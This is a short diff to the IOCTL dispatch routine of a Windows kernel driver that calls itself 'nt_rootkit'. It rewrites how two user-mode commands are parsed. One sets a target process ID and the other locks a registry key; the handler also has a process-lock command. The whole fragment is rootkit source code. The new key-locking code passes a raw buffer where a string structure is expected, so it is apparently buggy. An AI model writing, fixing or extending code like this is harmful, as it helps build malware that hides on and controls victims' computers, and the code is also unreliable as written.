@@ -51,7 +51,10 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
         case IO_PID_PROC:
                 DbgPrint(DRIVER_PREFIX "recieved %s",
                         (CHAR*)irp->AssociatedIrp.SystemBuffer);
-                proc_set_pid((PUINT32)irp->AssociatedIrp.SystemBuffer);
+                ULONG set_pid;
+                RtlCharToInteger(
+                        irp->AssociatedIrp.SystemBuffer, 10, &set_pid);
+                proc_set_pid(set_pid);
                 response = "nt_rootkit: process id set";
                 break;
         case IO_LOCK_PROC:
@@ -63,7 +66,10 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
         case IO_LOCK_KEY:
                 DbgPrint(DRIVER_PREFIX "recieved %s",
                         (CHAR*)irp->AssociatedIrp.SystemBuffer);
-                lock_key((PUNICODE_STRING)irp->AssociatedIrp.SystemBuffer);
+                UNICODE_STRING key;
+                RtlAnsiStringToUnicodeString(&key, 
+                        irp->AssociatedIrp.SystemBuffer, 1);
+                lock_key(&key);
                 response = "nt_rootkit: regkey locked";
                 break;
         default:
